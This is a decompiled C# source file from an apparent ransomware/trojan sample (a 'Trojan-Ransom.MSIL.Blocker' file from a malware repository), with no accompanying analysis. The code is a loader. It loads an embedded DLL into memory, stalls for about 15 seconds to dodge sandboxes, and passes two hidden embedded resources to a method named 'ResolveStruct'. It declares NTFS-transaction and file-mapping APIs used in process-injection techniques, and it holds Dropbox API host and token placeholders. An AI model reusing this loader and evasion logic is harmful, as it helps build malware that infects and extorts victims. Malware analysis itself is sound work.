// Decompiled with JetBrains decompiler
// Type: WindowsFormsApp1.Program
// Assembly: IMG_203_65_00201, Version=0.0.52.0, Culture=neutral, PublicKeyToken=null
// MVID: 512F8E1C-65FA-4A08-85E3-C51B3E89D23E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-9c36f6b8763377e8d99e2977ab75a9e8395fc76c0bef9452ce04256a388ad2d9.exe

using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace WindowsFormsApp1
{
  internal static class Program
  {
    [DllImport("ntdll.dll")]
    public static extern bool RtlSetCurrentTransaction(IntPtr TransactionHandle);

    [DllImport("ntdll.dll")]
    public static extern int NtRollbackTransaction(IntPtr TransactionHandle, bool Wait);

    [DllImport("kernel32.dll")]
    public static extern int GetFileSize(IntPtr FileHandle, IntPtr Test);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFileMapping(
      IntPtr hFile,
      int lpAttributes,
      uint flProtect,
      uint dwMaximumSizeHigh,
      uint dwMaximumSizeLow,
      string lpName);

    [DllImport("kernel32.dll", SetLastError = true)]
    internal static extern IntPtr MapViewOfFile(
      IntPtr hFileMappingObject,
      int dwDesiredAccess,
      uint dwFileOffsetHigh,
      uint dwFileOffsetLow,
      uint dwNumberOfBytesToMap);

    [STAThread]
    private static void Main(string[] args)
    {
label_0:
label_5:
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(Program.CurrentDomain_AssemblyResolve);
      do
      {
        if (true)
        {
          string[] strArray = new string[3]
          {
            "content.dropboxapi.com",
            "<FOLDER>",
            "<DROPBOX TOKEN>"
          };
          if (true)
            goto label_6;
label_3:
          continue;
label_6:
          args = strArray;
          goto label_3;
        }
        else
          goto label_5;
      }
      while (false);
      Program.Execute(args);
      if (false)
        goto label_0;
    }

    private static byte[] GetEmbeddedResourceContent(string resourceName)
    {
      // ISSUE: variable of a compiler-generated type
      Program.\u003C\u003Ec__DisplayClass6_0 cDisplayClass60;
      if (true)
      {
        // ISSUE: object of a compiler-generated type is created
        cDisplayClass60 = new Program.\u003C\u003Ec__DisplayClass6_0();
      }
      // ISSUE: reference to a compiler-generated field
      cDisplayClass60.resourceName = resourceName;
      if (true)
        goto label_9;
label_6:
      byte[] embeddedResourceContent;
      return embeddedResourceContent;
label_9:
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      // ISSUE: method pointer
      string str = ((IEnumerable<string>) executingAssembly.GetManifestResourceNames()).SingleOrDefault<string>(new Func<string, bool>((object) cDisplayClass60, __methodptr(\u003CGetEmbeddedResourceContent\u003Eb__0)));
      if (str == null)
      {
        if (true)
          str = "";
        else
          goto label_5;
      }
      string name = str;
      byte[] buffer;
      if (true)
      {
        Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
        buffer = new byte[manifestResourceStream.Length];
        manifestResourceStream.Read(buffer, 0, buffer.Length);
      }
label_5:
      embeddedResourceContent = buffer;
      goto label_6;
    }

    private static Assembly CurrentDomain_AssemblyResolve(
      object sender,
      ResolveEventArgs args)
    {
      Assembly assembly;
      do
      {
        if (true)
          goto label_12;
label_10:
        continue;
label_12:
        Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(typeof (CustomLoadLibrary).Namespace + ".ClassLibrary1.dll");
        try
        {
          MemoryStream destination = new MemoryStream();
          do
          {
            manifestResourceStream.CopyTo((Stream) destination);
          }
          while (false);
          assembly = Assembly.Load(destination.ToArray());
          goto label_10;
        }
        finally
        {
label_5:
          if (manifestResourceStream != null)
            manifestResourceStream.Dispose();
          else
            goto label_8;
label_7:
          if (false)
            goto label_5;
label_8:
          if (false)
            goto label_7;
        }
      }
      while (false);
      return assembly;
    }

    public static void Execute(string[] args)
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1 < 15 ? 1 : 0;
        bool flag;
        if (true)
          flag = num2 != 0;
        if (flag)
        {
          if (true)
            goto label_13;
label_2:
          if (true)
          {
            ++num1;
            continue;
          }
          break;
label_13:
          Thread.Sleep(999);
          goto label_2;
        }
        else
          goto label_3;
      }
      return;
label_3:
      if (true)
      {
        object instance = Activator.CreateInstance(typeof (ClassLibrary1.ClassLibrary1));
        object embeddedResourceContent1 = (object) Program.GetEmbeddedResourceContent("Kcfvujvwrsz");
        object embeddedResourceContent2 = (object) Program.GetEmbeddedResourceContent("Ohnuqmpv");
        bool flag;
        if (true)
        {
          // ISSUE: reference to a compiler-generated field
          if (Program.\u003C\u003Eo__8.\u003C\u003Ep__0 == null)
          {
            // ISSUE: reference to a compiler-generated field
            Program.\u003C\u003Eo__8.\u003C\u003Ep__0 = CallSite<Action<CallSite, object, object, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "ClassLibrary", (IEnumerable<Type>) null, typeof (Program), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[4]
            {
              CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
              CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
              CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
              CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
            }));
          }
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          Program.\u003C\u003Eo__8.\u003C\u003Ep__0.Target((CallSite) Program.\u003C\u003Eo__8.\u003C\u003Ep__0, instance, embeddedResourceContent1, embeddedResourceContent2, "ResolveStruct");
          flag = IntPtr.Size != 8;
        }
        if (flag)
          return;
        Console.WriteLine("[*] Done! ");
      }
    }
  }
}
